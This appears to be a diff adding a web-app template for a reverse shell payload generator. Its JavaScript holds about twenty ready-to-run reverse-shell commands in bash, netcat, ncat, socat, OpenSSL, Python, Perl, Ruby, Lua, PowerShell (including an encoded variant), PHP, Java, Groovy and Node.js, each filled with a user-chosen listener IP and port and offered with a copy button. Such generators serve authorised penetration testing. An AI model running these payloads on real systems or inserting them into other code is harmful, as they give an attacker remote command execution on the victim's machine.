@@ -1,0 +1,148 @@
+{% extends 'base.html' %}
+{% block title %}Payload Generator{% endblock %}
+{% block content %}
+<style>
+.gen-container { max-width: 1200px; margin: 0 auto; }
+.gen-header { background: linear-gradient(135deg, #1e3a5f 0%, #2d5a8e 100%); color: #fff; padding: 1.5rem 2rem; border-radius: 10px 10px 0 0; }
+.gen-header h2 { margin: 0 0 0.5rem 0; font-size: 1.5rem; }
+.gen-header p { margin: 0; opacity: 0.85; font-size: 0.95rem; }
+.gen-body { background: #fff; border: 1px solid #e0e0e0; border-top: none; border-radius: 0 0 10px 10px; padding: 2rem; }
+.config-row { display: flex; gap: 1rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
+.config-field { flex: 1; min-width: 200px; }
+.config-field label { display: block; font-weight: 600; margin-bottom: 0.4rem; color: #333; font-size: 0.9rem; }
+.config-field input, .config-field select { width: 100%; padding: 0.6rem 0.8rem; border: 1px solid #ccc; border-radius: 6px; font-size: 0.95rem; }
+.payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 1.2rem; margin-top: 1rem; }
+.payload-card { background: #1a1a2e; border-radius: 8px; overflow: hidden; border: 1px solid #333; }
+.payload-card-header { display: flex; align-items: center; justify-content: space-between; padding: 0.7rem 1rem; background: #16213e; border-bottom: 1px solid #333; }
+.payload-card-header .lang { color: #4fc3f7; font-weight: 600; font-size: 0.95rem; }
+.payload-card-header .copy-btn { background: #2196F3; color: #fff; border: none; padding: 0.3rem 0.8rem; border-radius: 4px; cursor: pointer; font-size: 0.8rem; }
+.payload-card-header .copy-btn:hover { background: #1976D2; }
+.payload-card-header .copy-btn.copied { background: #4caf50; }
+.payload-code { padding: 1rem; color: #e0e0e0; font-family: 'Courier New', monospace; font-size: 0.82rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow-y: auto; user-select: all; }
+.section-title { font-size: 1.1rem; font-weight: 600; color: #333; margin: 1.5rem 0 0.8rem; padding-bottom: 0.4rem; border-bottom: 2px solid #e0e0e0; }
+</style>
+
+<div class="gen-container">
+  <div class="gen-header">
+    <h2>🔧 Reverse Shell Payload Generator</h2>
+    <p>Generate reverse shell commands for various platforms and languages. Set your listener IP &amp; port, then copy the payload.</p>
+  </div>
+  <div class="gen-body">
+    <div class="config-row">
+      <div class="config-field">
+        <label>Listener IP (LHOST)</label>
+        <input type="text" id="lhost" placeholder="e.g. 10.10.14.5" />
+      </div>
+      <div class="config-field">
+        <label>Listener Port (LPORT)</label>
+        <input type="number" id="lport" value="{{ port }}" min="1" max="65535" />
+      </div>
+      <div class="config-field">
+        <label>Shell Type</label>
+        <select id="shelltype">
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="cmd.exe">cmd.exe</option>
+          <option value="powershell">powershell</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="section-title">🐧 Linux / macOS</div>
+    <div class="payload-grid" id="unix-payloads"></div>
+
+    <div class="section-title">🪟 Windows</div>
+    <div class="payload-grid" id="win-payloads"></div>
+
+    <div class="section-title">🌐 Web / Scripting Languages</div>
+    <div class="payload-grid" id="web-payloads"></div>
+  </div>
+</div>
+
+<script>
+const PAYLOADS = {
+  unix: [
+    {name: "Bash -i", fn: (h,p,s) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`},
+    {name: "Bash (no -i)", fn: (h,p,s) => `bash -c 'exec 5<>/dev/tcp/${h}/${p}; cat <&5 | while read line; do $line 2>&5 >&5; done'`},
+    {name: "Netcat (nc -e)", fn: (h,p,s) => `nc -e ${s} ${h} ${p}`},
+    {name: "Netcat (mkfifo)", fn: (h,p,s) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${s} -i 2>&1|nc ${h} ${p} >/tmp/f`},
+    {name: "Ncat (SSL)", fn: (h,p,s) => `ncat --ssl ${h} ${p} -e ${s}`},
+    {name: "Python3", fn: (h,p,s) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${s}","-i"])'`},
+    {name: "Python2", fn: (h,p,s) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${s}","-i"])'`},
+    {name: "Perl", fn: (h,p,s) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${s} -i");};'`},
+    {name: "Ruby", fn: (h,p,s) => `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("${s} -i <&%d >&%d 2>&%d",f,f,f)'`},
+    {name: "socat", fn: (h,p,s) => `socat exec:'${s} -li',pty,stderr,setsid,sigint,sane tcp:${h}:${p}`},
+    {name: "Lua", fn: (h,p,s) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('${s} -i <&3 >&3 2>&3');"`},
+    {name: "OpenSSL", fn: (h,p,s) => `mkfifo /tmp/s; ${s} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${h}:${p} > /tmp/s; rm /tmp/s`},
+  ],
+  win: [
+    {name: "PowerShell (TCPClient)", fn: (h,p) => `$LHOST = "${h}"; $LPORT = ${p}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output\`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()`},
+    {name: "PowerShell (One-Liner)", fn: (h,p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
+    {name: "PowerShell (Base64)", fn: (h,p) => {
+      const cmd = `$client = New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+      return `powershell -nop -enc [Base64 encode the above PowerShell command]\n\n# Command to encode:\n${cmd}`;
+    }},
+    {name: "Windows Netcat (nc.exe)", fn: (h,p) => `nc.exe -e cmd.exe ${h} ${p}`},
+  ],
+  web: [
+    {name: "PHP (exec)", fn: (h,p,s) => `php -r '$sock=fsockopen("${h}",${p});exec("${s} -i <&3 >&3 2>&3");'`},
+    {name: "PHP (proc_open)", fn: (h,p,s) => `php -r '$sock=fsockopen("${h}",${p});$proc=proc_open("${s} -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`},
+    {name: "Java", fn: (h,p,s) => `Runtime r = Runtime.getRuntime();\nProcess p = r.exec(new String[]{"${s}","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"});\np.waitFor();`},
+    {name: "Groovy", fn: (h,p,s) => `String host="${h}";int port=${p};String cmd="${s}";Process p=["${s}","-c",cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();`},
+    {name: "Node.js", fn: (h,p,s) => `require('child_process').exec('nc -e ${s} ${h} ${p}')`},
+    {name: "Node.js (net)", fn: (h,p,s) => `(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("${s}", []);var client = new net.Socket();client.connect(${p}, "${h}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`},
+  ]
+};
+
+function getValues() {
+  return {
+    h: document.getElementById('lhost').value || 'LHOST',
+    p: document.getElementById('lport').value || '5000',
+    s: document.getElementById('shelltype').value
+  };
+}
+
+function renderPayloads() {
+  const {h, p, s} = getValues();
+  ['unix','win','web'].forEach(cat => {
+    const container = document.getElementById(cat === 'unix' ? 'unix-payloads' : cat === 'win' ? 'win-payloads' : 'web-payloads');
+    container.innerHTML = '';
+    PAYLOADS[cat].forEach((payload, idx) => {
+      const code = payload.fn(h, p, s);
+      const card = document.createElement('div');
+      card.className = 'payload-card';
+      card.innerHTML = `
+        <div class="payload-card-header">
+          <span class="lang">${payload.name}</span>
+          <button class="copy-btn" onclick="copyPayload(this, '${cat}-${idx}')">📋 Copy</button>
+        </div>
+        <div class="payload-code" id="payload-${cat}-${idx}">${escapeHtml(code)}</div>
+      `;
+      container.appendChild(card);
+    });
+  });
+}
+
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.appendChild(document.createTextNode(text));
+  return div.innerHTML;
+}
+
+function copyPayload(btn, id) {
+  const el = document.getElementById('payload-' + id);
+  const text = el.textContent || el.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = '✅ Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = '📋 Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+document.getElementById('lhost').addEventListener('input', renderPayloads);
+document.getElementById('lport').addEventListener('input', renderPayloads);
+document.getElementById('shelltype').addEventListener('change', renderPayloads);
+
+renderPayloads();
+</script>
+{% endblock %}
